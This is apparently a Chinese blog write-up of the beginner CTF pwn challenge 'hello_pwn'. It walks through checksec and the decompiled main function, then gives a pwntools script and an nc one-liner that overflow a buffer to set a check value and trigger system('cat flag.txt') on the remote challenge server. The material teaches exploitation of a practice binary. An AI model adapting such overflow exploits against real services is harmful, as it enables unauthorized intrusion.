CTF攻防世界 pwn新手题 hello_pwn

发表于2020-12-18|更新于2020-12-31|ctfpwn
|字数总计:193|阅读时长:1分钟|阅读量:

下载文件后改名为hello_pwn

进行通过file判断附件文件类型

file hello_pwn

checksec一下，检查一下保护机制

pwn checksec hello_pwn

nc连接(或者本地运行)，尝试运行一下，没啥功能

./hello_pwn 
~~ welcome to ctf ~~     
lets get helloworld for bof

IDA反编译

__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
alarm(0x3Cu);
setbuf(stdout, 0LL);
puts("~~ welcome to ctf ~~     ");
puts("lets get helloworld for bof");
read(0, &unk_601068, 0x10uLL);
if ( dword_60106C == 'nuaa' )
    sub_400686();
return 0LL;
}

其中

__int64 sub_400686()
{
system("cat flag.txt");
return 0LL;
}

那很明显只需要dword_60106C位置的字符串为nuaa

exp

from pwn import *

# r = process('./hello_pwn')
r = remote("220.249.52.134",40228)
payload = 'a'*4+p32(1853186401)
r.recvuntil("lets get helloworld for bof\n")
r.sendline(payload)
print r.recv()

或者

echo aaaaaaun |nc 220.249.52.134 40228
